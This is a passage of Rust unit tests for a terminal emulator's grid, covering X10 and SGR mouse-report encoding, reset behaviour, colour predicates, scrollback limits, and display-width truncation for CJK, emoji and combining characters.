        assert_eq!(
            term.encode_mouse(MouseButton::Right, 10, 5, false).unwrap(),
            b"\x1b[35;10;5M".to_vec()
        );
        // No 223-column ceiling.
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 400, 300, true).unwrap(),
            b"\x1b[32;400;300M".to_vec()
        );
        assert_eq!(
            term.encode_mouse(MouseButton::WheelUp, 1, 1, true).unwrap(),
            b"\x1b[96;1;1M".to_vec()
        );
        // A drag carries the held button plus the motion bit.
        assert_eq!(
            term.encode_mouse_motion(Some(MouseButton::Left), 4, 2)
                .unwrap(),
            b"\x1b[64;4;2M".to_vec()
        );
    }

    #[test]
    fn mouse_is_silent_until_an_application_asks() {
        let term = TerminalGrid::new(20, 4);
        assert!(term.encode_mouse(MouseButton::Left, 1, 1, true).is_none());
        assert!(term
            .encode_mouse_motion(Some(MouseButton::Left), 1, 1)
            .is_none());
    }

    #[test]
    fn x10_mouse_encoding() {
        let mut term = TerminalGrid::new(20, 4);
        term.write(b"\x1b[?1000h");
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 1, 1, true).unwrap(),
            b"\x1b[M\x20\x21\x21".to_vec()
        );
        assert_eq!(
            term.encode_mouse(MouseButton::Middle, 3, 2, true).unwrap(),
            b"\x1b[M\x21\x23\x22".to_vec()
        );
        // Any release reports button 3.
        assert_eq!(
            term.encode_mouse(MouseButton::Right, 10, 5, false).unwrap(),
            b"\x1b[M\x23\x2a\x25".to_vec()
        );
    }

    #[test]
    fn x10_mouse_encoding_clamps_at_223() {
        let mut term = TerminalGrid::new(400, 400);
        term.write(b"\x1b[?1000h");
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 500, 400, true).unwrap(),
            vec![0x1b, b'[', b'M', 32, 255, 255]
        );
        // A 0 coordinate is still the first (1-based) cell, never byte 31.
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 0, 0, true).unwrap(),
            vec![0x1b, b'[', b'M', 32, 33, 33]
        );
    }

    #[test]
    fn sgr_mouse_encoding() {
        let mut term = TerminalGrid::new(400, 400);
        term.write(b"\x1b[?1000h\x1b[?1006h");
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 10, 5, true).unwrap(),
            b"\x1b[<0;10;5M".to_vec()
        );
        // SGR keeps the button number on release and flips the final byte.
        assert_eq!(
            term.encode_mouse(MouseButton::Right, 10, 5, false).unwrap(),
            b"\x1b[<2;10;5m".to_vec()
        );
        // And carries coordinates the legacy form cannot.
        assert_eq!(
            term.encode_mouse(MouseButton::Left, 400, 300, true).unwrap(),
            b"\x1b[<0;400;300M".to_vec()
        );
    }

    #[test]
    fn wheel_reports_a_press_with_no_release() {
        let mut term = TerminalGrid::new(20, 4);
        term.write(b"\x1b[?1000h");
        assert_eq!(
            term.encode_mouse(MouseButton::WheelUp, 1, 1, true).unwrap(),
            vec![0x1b, b'[', b'M', 32 + 64, 33, 33]
        );
        assert!(term
            .encode_mouse(MouseButton::WheelUp, 1, 1, false)
            .is_none());
        term.write(b"\x1b[?1006h");
        assert_eq!(
            term.encode_mouse(MouseButton::WheelDown, 2, 3, true).unwrap(),
            b"\x1b[<65;2;3M".to_vec()
        );
        assert!(term
            .encode_mouse(MouseButton::WheelDown, 2, 3, false)
            .is_none());
    }

    #[test]
    fn motion_needs_1002_or_1003() {
        let mut term = TerminalGrid::new(20, 4);
        term.write(b"\x1b[?1000h\x1b[?1006h");
        // 1000 reports presses only.
        assert!(term
            .encode_mouse_motion(Some(MouseButton::Left), 4, 2)
            .is_none());
        assert!(term.encode_mouse_motion(None, 4, 2).is_none());

        term.write(b"\x1b[?1002h");
        assert_eq!(
            term.encode_mouse_motion(Some(MouseButton::Left), 4, 2)
                .unwrap(),
            b"\x1b[<32;4;2M".to_vec()
        );
        // A bare move with nothing held stays quiet under 1002.
        assert!(term.encode_mouse_motion(None, 4, 2).is_none());

        term.write(b"\x1b[?1003h");
        assert_eq!(
            term.encode_mouse_motion(None, 4, 2).unwrap(),
            b"\x1b[<35;4;2M".to_vec()
        );
    }

    #[test]
    fn x10_motion_carries_the_held_button_plus_32() {
        let mut term = TerminalGrid::new(20, 4);
        term.write(b"\x1b[?1002h");
        assert_eq!(
            term.encode_mouse_motion(Some(MouseButton::Left), 4, 2)
                .unwrap(),
            vec![0x1b, b'[', b'M', 32 + 32, 32 + 4, 32 + 2]
        );
    }

    #[test]
    fn full_reset_clears_paste_and_mouse_state() {
        let mut term = TerminalGrid::new(20, 4);
        term.write(b"\x1b[?2004h\x1b[?1003h\x1b[?1006h");
        term.write(b"\x1bc"); // RIS
        assert!(!term.bracketed_paste());
        assert_eq!(term.mouse_mode(), MouseMode::Off);
        assert_eq!(term.mouse_encoding, MouseEncoding::X10);
    }

    #[test]
    fn default_color_predicates_match_what_resets_leave_behind() {
        let mut term = TerminalGrid::new(20, 4);
        term.set_palette(marker_palette());
        term.write(b"\x1b[31;42mA\x1b[39;49mB\x1b[0mC");
        let [a, b, c] = [0, 1, 2].map(|x| term.cells[0][x].style);
        assert!(!is_default_fg(a.fg) && !is_default_bg(a.bg));
        assert!(is_default_fg(b.fg) && is_default_bg(b.bg));
        assert!(is_default_fg(c.fg) && is_default_bg(c.bg));
        let blank = Cell::default().style;
        assert!(is_default_fg(blank.fg) && is_default_bg(blank.bg));
        // Each predicate answers for its own role only.
        assert!(!is_default_fg(DEFAULT_BG) && !is_default_bg(DEFAULT_FG));
    }

    #[test]
    fn scrollback_cap_is_enforced() {
        let mut term = TerminalGrid::new(10, 2);
        for _ in 0..(MAX_SCROLLBACK + 50) {
            term.write(b"x\r\n");
        }
        assert_eq!(term.scrollback.len(), MAX_SCROLLBACK);
    }

    // ── display width ───────────────────────────────────────────────────────

    /// Wide, zero-width and plain samples: ASCII, pure CJK, mixed, emoji,
    /// a decomposed accent, and a joiner plus a variation selector.
    const WIDTH_SAMPLES: [&str; 6] = [
        "production-database",
        "生产环境数据库",
        "db-主库-backup",
        "🚀😀x🚀",
        "cafe\u{301}-server",
        "a\u{200D}b\u{FE0F}c",
    ];

    #[test]
    fn display_width_counts_columns_not_chars() {
        assert_eq!(display_width(""), 0);
        assert_eq!(display_width("prod-db"), 7);
        // Every CJK character is two columns: twice its char count.
        assert_eq!(display_width("生产数据库"), 10);
        assert_eq!(display_width("db-主库"), 7);
        assert_eq!(display_width("🚀 api"), 6);
        // A combining mark adds nothing, so both spellings of "café" agree.
        assert_eq!(display_width("cafe\u{301}"), 4);
        assert_eq!(display_width("caf\u{e9}"), 4);
        // Nor do a joiner or a variation selector.
        assert_eq!(display_width("a\u{200D}b\u{FE0F}"), 2);
    }

    /// The helper must agree with where the grid itself puts the cursor, or a
    /// title sized with it would not match the terminal it names.
    #[test]
    fn display_width_matches_the_columns_the_grid_advances() {
        for s in WIDTH_SAMPLES {
            let mut term = TerminalGrid::new(200, 2);
            term.write(s.as_bytes());
            assert_eq!(term.cursor_x, display_width(s), "{:?}", s);
        }
    }

    #[test]
    fn truncate_to_width_leaves_a_string_that_fits_alone() {
        assert_eq!(truncate_to_width("", 0), "");
        assert_eq!(truncate_to_width("prod", 10), "prod");
        // Exactly at the budget: nothing is cut, so no ellipsis either.
        assert_eq!(truncate_to_width("abcdef", 6), "abcdef");
        assert_eq!(truncate_to_width("生产环境", 8), "生产环境");
        assert_eq!(truncate_to_width("db-主库", 7), "db-主库");
        assert_eq!(truncate_to_width("cafe\u{301}", 4), "cafe\u{301}");
    }

    #[test]
    fn truncate_to_width_counts_the_ellipsis_in_the_budget() {
        // Nine columns of text plus the ellipsis make ten.
        assert_eq!(truncate_to_width("production-database", 10), "productio…");
        // One column under the exact fit.
        assert_eq!(truncate_to_width("abcdef", 5), "abcd…");
        assert_eq!(truncate_to_width("生产环境", 7), "生产环…");
        // Room for the ellipsis alone, then not even that.
        assert_eq!(truncate_to_width("abc", 1), "…");
        assert_eq!(truncate_to_width("abc", 0), "");
    }

    #[test]
    fn truncate_to_width_drops_a_wide_char_that_would_straddle_the_edge() {
        // Pure CJK: a third character would make 6 columns against a budget of 5.
        assert_eq!(truncate_to_width("生产环境数据库", 6), "生产…");
        assert_eq!(truncate_to_width("生产环境数据库", 9), "生产环境…");
        // Mixed: "db-" is 3, and "主" would make 5 against a budget of 4.
        assert_eq!(truncate_to_width("db-主库-backup", 5), "db-…");
        assert_eq!(truncate_to_width("db-主库-backup", 6), "db-主…");
        // Emoji are two columns as well.
        assert_eq!(truncate_to_width("🚀🚀🚀", 5), "🚀🚀…");
        assert_eq!(truncate_to_width("🚀🚀🚀", 4), "🚀…");
    }

    #[test]
    fn truncate_to_width_keeps_a_combining_mark_with_its_base() {
        let s = "cafe\u{301}-server"; // 12 chars, 11 columns
        // The accent rides along with its "e"...
        assert_eq!(truncate_to_width(s, 5), "cafe\u{301}…");
        // ...and goes with it, rather than landing on the "f".
        assert_eq!(truncate_to_width(s, 4), "caf…");
    }

    #[test]
    fn truncate_to_width_never_overflows_or_rewrites_the_text() {
        for s in WIDTH_SAMPLES {
            for max in 0..=display_width(s) + 1 {
                let out = truncate_to_width(s, max);
                assert!(display_width(&out) <= max, "{:?} at {} became {:?}", s, max, out);
                if out == s {
                    continue;
                }
                // Whatever was cut, the rest is a whole-char prefix of `s`
                // followed by the ellipsis — or nothing, when even that is too wide.
                assert_eq!(out.is_empty(), max == 0, "{:?} at {}", s, max);
                let kept = out.strip_suffix('…').unwrap_or(&out);
                assert!(s.starts_with(kept), "{:?} at {} became {:?}", s, max, out);
            }
        }
    }

    /// `ANSI_COLORS` is only read by tests, so it is compiled only for them. An
    /// allowance in its place would also hide the next item that goes dead.
    #[test]
    fn nothing_in_the_terminal_is_excused_from_the_dead_code_lint() {
        const SRC: &str = include_str!("mod.rs");
        // Split so this test's own text does not match.
        assert!(!SRC.contains(concat!("allow(", "dead_code)")));
    }
}
